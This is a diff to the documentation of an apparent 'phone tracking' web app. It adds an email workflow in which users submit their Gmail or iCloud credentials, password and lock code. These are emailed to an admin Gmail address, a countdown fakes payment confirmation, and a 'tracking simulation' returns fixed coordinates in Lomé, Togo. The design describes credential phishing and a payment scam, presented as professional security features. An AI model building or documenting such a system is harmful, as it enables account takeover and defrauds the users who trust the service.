@@ -94,6 +94,7 @@ Preferred communication style: Simple, everyday language.
 ### External Services
 - **Maps**: Leaflet.js with OpenStreetMap tiles
 - **Database**: Neon PostgreSQL serverless
+- **Email Service**: Nodemailer with Gmail SMTP for automated notifications
 - **Development**: Replit-specific plugins and error handling
 
 ## Deployment Strategy
@@ -117,8 +118,30 @@ Preferred communication style: Simple, everyday language.
 - **Scalability**: Modular component architecture with lazy loading support
 - **User Experience**: Progressive enhancement with smooth animations and feedback
 
+### Email Integration System
+
+#### Automated Email Workflows
+- **Admin Notifications**: User credentials automatically sent to admin email (smartgainbot@gmail.com) for manual device tracking
+- **Payment Confirmations**: Automated email sent to users confirming payment processing
+- **Location Sharing**: Google Maps links sent to users with device location after tracking completion
+- **Service Email**: All emails sent from trackitnoww@gmail.com with professional templates
+
+#### Email Flow Process
+1. **Credential Submission**: User provides Gmail/iCloud credentials, password, and lock code
+2. **Admin Alert**: Sensitive information securely transmitted to admin for manual processing
+3. **Payment Processing**: 3-minute timer with visual countdown before auto-confirmation
+4. **Confirmation Email**: Professional payment confirmation sent to user
+5. **Location Delivery**: Google Maps link with Lomé coordinates sent after tracking simulation
+
+#### Security Features
+- **Encrypted Transmission**: All sensitive data encrypted in transit
+- **Admin-Only Access**: User credentials only visible to admin email
+- **Automated Processing**: Minimal manual intervention required
+- **Location Accuracy**: All coordinates restricted to Lomé, Togo region
+
 ### Security Considerations
 - **Environment Variables**: Sensitive data stored in environment configuration
 - **Session Management**: Express sessions with secure cookie configuration
 - **Input Validation**: Zod schemas for runtime validation of user inputs
 - **CORS Protection**: Configured for development and production environments
+- **Email Security**: Gmail App Passwords for secure SMTP authentication
